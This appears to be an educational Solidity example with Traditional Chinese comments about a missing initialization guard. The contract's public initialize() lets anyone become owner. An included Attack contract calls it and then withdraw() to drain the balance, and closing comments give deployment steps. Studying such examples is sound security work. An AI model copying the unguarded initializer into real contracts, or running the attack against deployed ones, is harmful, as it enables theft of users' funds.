// SPDX-License-Identifier: UNLICENSED
// Vulnerable Code Example for Improper Declaration or Initialization 漏洞
// 此漏洞的根本問題在於合約中的 initialize() 函式，沒有檢查是否已經初始化，
// 攻擊者可以藉此呼叫 initialize() 並將自己設為 owner，進而拿走合約中的資金。

pragma solidity >=0.8.0;

contract VulnerableContract {
    // 漏洞重點：owner 未在建構子中初始化，改由未受保護的 initialize() 初始化
    address public owner;  // 預期應於部署時設置，但沒有保護

    // initialize 函式允許任何人呼叫，沒有檢查是否已經初始化
    function initialize() public {
        // VULNERABLE: 沒有檢查是否已初始化，攻擊者可以直接覆蓋 owner
        owner = msg.sender;
    }

    // 允許外部存款
    function deposit() public payable {}

    // 僅允許 owner 提款
    function withdraw() public {
        require(msg.sender == owner, "Not owner");
        payable(owner).transfer(address(this).balance);
    }

    // 使用 receive 接收 Ether
    receive() external payable {}
}

// 攻擊合約示範
contract Attack {
    VulnerableContract public vulnerable;
    
    // 修改 constructor 參數型別為 address payable 以符合 type conversion 要求
    constructor(address payable _vulnerableAddress) {
        // 明確轉型為 payable address
        vulnerable = VulnerableContract(_vulnerableAddress);
    }

    // 攻擊步驟：先呼叫 initialize() 取得 owner 權限，再呼叫 withdraw() 窃取合約資金
    function attack() public {
        // 步驟1：利用未保護的 initialize() 設定自己為 owner
        vulnerable.initialize();
        
        // 步驟2：提款至攻擊者地址
        vulnerable.withdraw();
    }

    // 接收從 VulnerableContract 轉來的 Ether
    receive() external payable {}
}

/*
部署與攻擊說明 (繁體中文):
1. 部署 VulnerableContract，因為沒有透過 constructor 初始化 owner，owner 可被任意設定。
2. 部署 Attack 合約時傳入 VulnerableContract 的地址，呼叫 attack() 會使攻擊者呼叫 initialize() 得到 owner 權限，
   後續 withdraw() 將合約所有資金轉移至攻擊者地址。
這展示了 Improper Declaration or Initialization 漏洞如何被利用於竊取資金。
*/